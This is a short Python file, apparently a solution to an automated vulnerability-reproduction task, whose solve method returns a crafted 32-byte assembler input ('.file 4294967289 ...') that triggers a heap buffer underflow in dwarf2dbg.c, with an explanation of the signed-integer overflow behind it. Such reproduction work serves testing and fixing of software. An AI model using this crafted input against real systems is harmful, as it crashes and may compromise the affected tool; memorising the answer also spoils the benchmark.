import os

class Solution:
    """
    Generates a Proof-of-Concept (PoC) input that triggers a Heap Buffer Overflow.
    """
    def solve(self, src_path: str) -> bytes:
        """
        Generate a PoC that triggers the vulnerability.

        The vulnerability is in dwarf2dbg.c, in the `assign_file_to_slot` function.
        It's triggered by a `.file` directive with a large integer that overflows
        a signed 32-bit integer when parsed.

        The number 4294967289 (which is 2^32 - 7 or 0xFFFFFFF9) is parsed into a
        signed `int`, resulting in the value -7. This negative value is then used
        as an index into a heap-allocated array, causing a heap buffer underflow
        (a type of buffer overflow).

        To create a PoC of the target length (32 bytes), we construct the line:
        .file 4294967289 "<filename>"\n

        The length breakdown is as follows:
        - ".file "          : 6 bytes
        - "4294967289"      : 10 bytes
        - " "               : 1 byte
        - '""' (quotes)     : 2 bytes
        - "\n" (newline)    : 1 byte
        - Total fixed parts : 20 bytes

        To reach 32 bytes, the filename inside the quotes must be 12 bytes long.
        We can use a simple repeating character like 'a'.

        Args:
            src_path: Path to the vulnerable source code tarball (not used).

        Returns:
            bytes: The PoC input that should trigger the vulnerability.
        """
        # The PoC string is crafted to be exactly 32 bytes.
        # ".file 4294967289 \"<12-byte-filename>\"\n"
        poc = b'.file 4294967289 "aaaaaaaaaaaa"\n'
        return poc